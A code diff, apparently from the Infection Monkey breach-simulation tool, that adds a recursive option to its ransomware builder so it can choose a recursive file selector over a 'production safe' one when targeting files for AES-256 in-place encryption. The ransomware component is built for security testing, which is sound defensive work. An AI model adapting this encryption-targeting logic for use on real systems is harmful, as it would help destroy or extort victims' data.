@@ -7,7 +7,7 @@ from infection_monkey.utils.bit_manipulators import flip_bits
 
 from . import readme_dropper
 from .aes_256_file_encryptor import AES256FileEncryptor
-from .file_selectors import ProductionSafeTargetFileSelector
+from .file_selectors import ProductionSafeTargetFileSelector, RecursiveTargetFileSelector
 from .in_place_file_encryptor import InPlaceFileEncryptor
 from .ransomware import Ransomware
 from .ransomware_options import EncryptionAlgorithm, RansomwareOptions
@@ -28,7 +28,7 @@ def build_ransomware(
     ransomware_options = RansomwareOptions(options)
 
     file_encryptor = _build_file_encryptor(ransomware_options)
-    file_selector = _build_file_selector(ransomware_options.file_extension)
+    file_selector = _build_file_selector(ransomware_options)
     leave_readme = _build_leave_readme()
 
     return Ransomware(
@@ -50,12 +50,18 @@ def _build_file_encryptor(ransomware_options: RansomwareOptions):
     )
 
 
-def _build_file_selector(file_extension: str):
+def _build_file_selector(ransomware_options: RansomwareOptions):
+    file_extension = ransomware_options.file_extension
+    recursive = ransomware_options.recursive
+
     targeted_file_extensions = TARGETED_FILE_EXTENSIONS.copy()
     if file_extension:
         targeted_file_extensions.discard(file_extension)
 
-    return ProductionSafeTargetFileSelector(targeted_file_extensions)
+    if recursive:
+        return RecursiveTargetFileSelector(targeted_file_extensions)
+    else:
+        return ProductionSafeTargetFileSelector(targeted_file_extensions)
 
 
 def _build_leave_readme():
